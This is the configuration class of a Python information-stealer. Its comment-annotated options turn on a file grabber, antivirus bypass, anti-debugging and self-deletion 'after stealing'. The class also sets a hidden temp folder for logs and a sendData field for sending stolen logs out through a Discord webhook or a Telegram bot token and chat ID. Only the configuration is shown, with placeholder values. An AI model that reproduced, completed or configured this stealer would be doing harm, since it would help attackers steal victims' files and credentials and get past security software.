class config:
    enableFileGrabber = False #enable file grabber
    oneStart = False #enable this if you want logs to come only from unique computers
    id = 19380887093145377305 #unique id for oneStart
    avbypass = False #enable antiviruses bypass
    selfDestruct = False #deletes itself after stealing
    debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)
    pathToLogs = "\\AppData\\Local\\Temp\\{1116-3289-5081-2976}" #path where will be stored logs before sending (from user dir)

    sendData = [0,"",""]# You can write your address for sending logs here

    #example for Discord [0, "url of your WebHook", "null"]
    #example for Telegram [1, "HTTPAPI that you got from botFather", "your chat ID"]